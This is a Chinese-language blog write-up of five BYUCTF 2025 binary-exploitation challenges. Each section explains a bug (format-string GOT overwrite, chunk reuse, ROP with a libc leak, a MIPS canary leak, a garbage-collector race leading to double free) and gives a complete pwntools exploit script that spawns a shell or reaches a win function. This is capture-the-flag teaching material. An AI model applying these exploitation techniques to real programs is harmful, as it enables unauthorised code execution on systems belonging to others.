---
title: 【BYUCTF-2025】PWN WriteUp
authors: [nova]
date: 2025-05-23
---

难得写几道。

> Attachments https://github.com/BYU-CSA/BYUCTF-2025?tab=readme-ov-file

<!--truncate-->

## GOAT

![image-20250523000531559](https://oss.nova.gal/img/image-20250523000531559.png)

简单的 fmtstr 题，partial RELRO，直接改 got 表。要爆破一位，把 snprintf 改成 system 即可。

注意这个它会写入一点点内容，所以要用到 fmtstr_payload 里的 numwritten

```python
from pwno import *


# Brute force

context.terminal = ["tmux", "splitw", "-h"]

sh = gen_sh()
dbg("b printf")

payload = fmtstr_payload(
    8,
    {elf.got["snprintf"]: p16(0x4400)},
    write_size="short",
    numbwritten=len("Are you sure? You said:\n"),
)
sla(b"What's your name? ", payload)

sla(b"\n", "/bin/sh\x00")
ia()
```

## minecraft_youtube

显然，只要让 user->magic = 0x1337 即可。

观察可以发现 user_t 和 nametag 是一样大小的，意味着我们很有可能可以通过 free + malloc 的方式重用这些 chunk。

![image-20250523001903872](https://oss.nova.gal/img/image-20250523001903872.png)

在 logout 函数里，我们看到了 free 函数

![image-20250523002029284](https://oss.nova.gal/img/image-20250523002029284.png)

观察这个顺序，发现 nametag 是后释放的，在 fast / tcache 里都是 FILO，所以显然在这之后我们注册角色就会拿到 nametag 的 chunk。

nametag 我们可控 0x18 里的后 0x10 个字节，正好对应我们 user_t 的 magic 字段。因此，我们拿取一个 nametag，把 lastname 设置为 0x1337，然后执行 logout，再执行 register，再走一遍 7 即可。

至于 case 4 的让 id 变成 0x5FFFFFF + 1，我只能说也不是不行（笑

![image-20250523003538889](https://oss.nova.gal/img/image-20250523003538889.png)

```python
from pwno import *

context.terminal = ["tmux", "splitw", "-h"]

sh = gen_sh()

sla(b"now: ", "nova")
sla(b"Leave\n", b"3")

while b"last name:" not in recvl():
    sla("Leave\n", b"3")

sl(b"nova")
send(p16(0x1337))

sla("Leave\n", b"5")
sla(b"now: ", "nova")
sla("Leave\n", b"7")
dbg()
ia()

```

题目没给 libc，看了一眼 Dockerfile 是拉的 ubuntu，所以应该和我 Arch 大差不差。

## game-of-yap

两次栈溢出，但是保护开的比较多。有两个后门函数肯定是要用的。![image-20250523004310935](https://oss.nova.gal/img/image-20250523004310935.png)

yap 用来 leak binary 地址，nothing 用来做 gadget，关键是拿来干什么。

这个时候的 rsi 就说我们 read 的 buf 指针，因此如果是 system 那直接执行了，问题是我们需要 leak libc 地址。

我们其实可以考虑跳到 yap 中间，但这个时候 rsi 指向的是 buf。前面如果有 gadget 可以把一个 libc 搞到 rsi 也可以。观察后，发现显然并没有这么好用的 gadget，难点在于这个 gadget 要**不破坏 rsp 地址的情况下 retn 从而继续我们的 rop chain**

既然 rdi 是我们可控的，我们观察函数列表，看看有什么能用的，显然是 printf。

因此我们 partial overwrite leak binary，然后 rop 到 printf leak libc，回到 libc_start_main 再来一次 system binsh 即可。

注意，这里我们第一次跳转到 yap + 8 的地方，这样的话他就不会开一个新的栈帧，从而在 pop rbp, retn 的时候回到 main 去。

```python
from pwno import *

context.terminal = ["tmux", "splitw", "-h"]

libc = ELF("/usr/lib/libc.so.6")

sh = gen_sh()


sa(b" chance...\n", b"A" * 0x108 + p8((elf.sym["yap"] + 8) & 0xFF))
elf.address = int(recvu(b"\n", drop=True), 16) - elf.sym["play"]
success(elf.address)

payload = b"BBBB%7$p"
# dbg("b printf")
sa(
    b"try...\n",
    payload.ljust(0x108)
    + p64(elf.address + 0x1243)
    + p64(elf.plt["printf"])
    + p64(elf.sym["main"]),
)

recvu(b"BBBB")
libc.address = int(recvu(b"Can", drop=True), 16) - 0x276B5
success(libc.address)

pop_rax_ret = libc.address + 0xD40F7  # pop rax; ret;
pop_rdi_ret = libc.address + 0x10194A  # pop rdi; ret;
pop_rsi_ret = libc.address + 0x53187  # pop rsi; ret;
syscall_ret = libc.address + 0x928C6  # syscall; ret;
binsh = libc.address + 0x1AEF24  # /bin/sh

dbg(s=-1)
sa(
    b"chance...\n",
    b"A".ljust(0x108) + p64(pop_rdi_ret) + p64(binsh) + p64(libc.sym["system"]),
)

ia()
```

## mips

异构 mips32 题，两次读一次溢出，有后门函数，感觉难点在怎么打开和调试（笑

不过它的解题脚本还是非常具有参考意义的。

简单介绍一下 mips 的 canary 机制，其实观察图上我们就可以知道，它是通过 $gp 寄存器找到一个偏移，在这个偏移上存了存放我们 canary 地址的指针。

![image-20250523020719658](https://oss.nova.gal/img/image-20250523020719658.png)

在栈上，就是用 $fp 来指向 canary，最后返回到 $ra

由于没有开启 pie，那么 $gp - 0x7fb0 这个值就是固定的 0x420060，这样就可以通过

1. 读 0x420060 拿 \_\_stack_chk_guard 指针
2. 读 \_\_stack_chk_guard 拿 canary

的方式 leak canary，而不用 leak 栈地址再 leak canary。

exp 懒得写了，留在这里供以后异构抄

```python
from pwn import *
from subprocess import getoutput

context.log_level = "debug"
build = "mipsel32r5-glibc"
binary = "./ctf/mips"
elf = context.binary = ELF(binary, checksec=False)
docker = ELF("/usr/bin/docker", checksec=False)

gs = """
set architecture mips:isa32r5
break main
b *0x400c88
continue
"""

if args.REMOTE:
    p = remote("mips.chal.cyberjousting.com", 1357)

    ### SOLVE POW ###
    p.recvline()
    cmd = p.recvline().decode().strip()
    print(f"Solving POW: {cmd}")
    answer = getoutput(cmd)
    p.sendline(answer.encode())
elif args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "70%"]
    p = docker.process(
        [
            "run",
            "-i",
            "--rm",
            "-v",
            "./ctf:/target/ctf",
            "-p",
            "12346:1234",
            f"legoclones/mips-pwn:{build}",
            "chroot",
            "/target",
            "/qemu",
            "-g",
            "1234",
            "/ctf/mips",
        ]
    )
    print("Remote debugging started...")
    gdb.attach(("127.0.0.1", 12346), gdbscript=gs, exe=binary)
else:
    p = docker.process(
        [
            "run",
            "-i",
            "--rm",
            "-v",
            "./ctf:/target/ctf",
            f"legoclones/mips-pwn:{build}",
            "chroot",
            "/target",
            "/qemu",
            "/ctf/mips",
        ]
    )


### GET CANARY ###
canary_got_addr = 0x420060

p.recvuntil(b"> ")
p.sendline(b"1")
p.sendline(hex(canary_got_addr).encode())

canary_addr = int(p.recvline().strip().split(b" ")[-1], 16)
print(f"Canary GOT: {hex(canary_got_addr)}")

p.recvuntil(b"> ")
p.sendline(b"1")
p.sendline(hex(canary_addr).encode())
canary = int(p.recvline().strip().split(b" ")[-1], 16)
print(f"Canary: {hex(canary)}")


### EXPLOIT OVERFLOW ###
p.recvuntil(b"> ")
p.sendline(b"2")

payload = flat(
    b"A" * 0x10,  # padding
    p32(canary),  # canary
    p32(0),  # s8
    p32(0x400964),  # ra (win())
)
p.sendline(payload)


p.interactive()

```

## tcl

race 题，这题符号基本都留着了，汇编还是挺好看的。

首先它开了一个 5s 一运行的垃圾回收线程，它查找所有 refcnt == 0 的 obj，放入一个局部数组中，然后首先 free 掉它们（每个间隔 0x1388 us），free 完再去遍历一遍数组，确认 refcnt == 0 才 set null。这里显然有一个攻击窗口，当我们待回收的数组较大，那么第一个 free 和 setnull 之间就会有 0x1388 \* len us 的窗口可供利用。如果我们能够趁这个时候把其中一个已经 free 但是还没改为 null 的 refcnt 增加，它就不会被 set null，从而留存一个 dangling pointer。

![image-20250523102739500](https://oss.nova.gal/img/image-20250523102739500.png)

观察 refcnt 增加的条件。int 类型的只要是数字相同即可，比较符合我们的需求，但是注意的是它是 `key = value` 的形式，`key` 本身会调用 strdup 拿一个 chunk，因此，为了 chunk 好看一些，我们最好都用相同的 key，这样只会创建一个 chunk 用于存储 key，一个 obj 用于存储 string object，其他的都可以拿来作 int object。

理想情况是这样的：我们首先分配 1+80 个 chunk，在第一次 gc 的时候，它即将释放掉所有 obj，并且将指针清空。我们在它释放第 40 个 chunk 时进行第二次输入，分配 1 + 10 个 chunk。它们会拿到 0-10 号 chunk（对应 0-9 obj），并且分配在 idx 80-89 上。

紧接着，gc 继续进行，free 完剩下的 obj，并且指针置空。此时由于 0-9 obj refcnt = 1，因此不会被置空。此次 gc 结束后，我们拥有了 0-9 obj 和 80-89 obj，它们指向相同的内存。

随后，第二次 gc 进行，它会最终形成一个形如 fastbin->9->8->7->...->1->0->9->8->... 的循环链表。此时，我们拿取前 10 个，将其 fd 修改为 malloc_hook，再拿取后 10 个，将其改为后门，即可完成 race condition 的利用。

例如，在这种情况下，我们就找到了一组对应。

![image-20250523124018264](https://oss.nova.gal/img/image-20250523124018264.png)

非常巧合的，我们这个 loop 相隔非常近，因此我们能直接当 double free 来做。

![image-20250523124452589](https://oss.nova.gal/img/image-20250523124452589.png)

随便调调就出来了。

![image-20250523132631458](https://oss.nova.gal/img/image-20250523132631458.png)

不过这个 exp 没法正常打，我不在这个地方加 dbg() 这个 gc 时机就不对（笑），而且这里如果是 sleep 5 的话第一次 gc 早就过了，我测试在大概 4.5s 左右。

```python
from pwno import *

context.terminal = ["tmux", "splitw", "-h"]
gdb.binary = lambda: "/usr/bin/gdb-gef"

sh = gen_sh()

libc.address = int(recvl()[:-1], 16) - libc.sym["alarm"]

payload = b"#START\n"

for i in range(80):
    payload += b"A" * 0x20 + b" = "  # different size, easier to exploit
    payload += str(i).encode()
    payload += b"\n"
payload += b"#END\n"

sa(b"===\n", payload)

# make sure obj0 and str chunk will not be freed.
payload = b"#START\n"
payload += b"A" * 0x20 + b" = "
payload += str(114514).encode()
payload += b"\n"
sa(b"===\n", payload)
recv()
sleep(5 + 0.005 * 50)

payload = b""
for i in range(10):
    payload += b"A" * 0x20 + b" = "
    payload += str(1919810 + i).encode()
    payload += b"\n"
send(payload)
dbg("b *0x401055\np/x (void*[100])objects\nc", s=-1)

payload = b"#END\n"
send(payload)
recv()

sleep(5)
payload = b"#START\n"
for i in range(14):
    payload += b"A" * 0x20 + b" = "
    payload += str(2333 + i).encode()
    payload += b"\n"

success(libc.address)
pause()
send(payload)

payload = b"A" * 0x20 + b" = "
payload += str(libc.sym["__malloc_hook"]).encode()
payload += b"\n"

payload += b"A" * 0x20 + b" = "
payload += str(6666).encode()
payload += b"\n"

payload += b"A" * 0x20 + b" = "
payload += str(6657).encode()
payload += b"\n"

payload += b"A" * 0x20 + b" = "
payload += str(elf.sym["win"]).encode()
payload += b"\n"

pause()
# b *0x400EF5
payload += b"A" * 0x20 + b" = "
payload += str(0xDEADBEEF).encode()
payload += b"\n"

send(payload)
ia()

```

至于正统的是真没法打，完全不知道它是在什么时候 gc 的，试了个 sleep(5-i\*0.05) 从 -100 到 100 也没打出报错，感觉不容易，更别提在报错之后去测哪里开始循环了，放弃！
